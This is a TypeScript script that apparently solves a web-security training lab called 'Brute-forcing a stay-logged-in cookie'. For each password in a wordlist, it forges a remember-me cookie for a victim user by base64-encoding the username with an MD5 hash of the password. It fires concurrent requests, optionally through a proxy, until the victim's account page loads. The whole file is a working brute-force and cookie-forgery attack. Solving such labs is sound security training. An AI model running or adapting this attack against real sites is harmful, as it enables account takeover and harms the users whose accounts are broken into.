import md5 from "md5";
import { getParsedInputFromUser } from "../../../utils/getParsedInputFromUser.js";
import { runTasks } from "../../../utils/runTasks.js";
import { victimsCredentials } from "../../../config/credentials.js";
import { getPasswords } from "../../../config/getPasswords.js";

const { labUrl, concurrencyLimit, httpClient } = getParsedInputFromUser({
  description: "Lab: Brute-forcing a stay-logged-in cookie",
  concurrency: true,
  proxy: true,
});

const passwords = await getPasswords();
const tasks = passwords.map((password: string) => () => task(password));
runTasks(tasks, concurrencyLimit);

async function task(password: string) {
  const resp = await httpClient.get(labUrl, {
    headers: {
      cookie: getCookie(password),
    },
  });

  if (isLoggedIn(resp.data)) {
    console.log(`${password}: success`);
    console.log(
      `Login with username "${victimsCredentials.username}" and password "${password}" to solve the lab`,
    );
    process.exit(0);
  } else {
    console.log(`${password}: fail`);
  }
}

function getCookie(password: string) {
  const hash = md5(password);
  const value = Buffer.from(`${victimsCredentials.username}:${hash}`).toString(
    "base64",
  );
  return "stay-logged-in=" + value;
}

function isLoggedIn(html: string) {
  return html.includes(`my-account?id=${victimsCredentials.username}`);
}
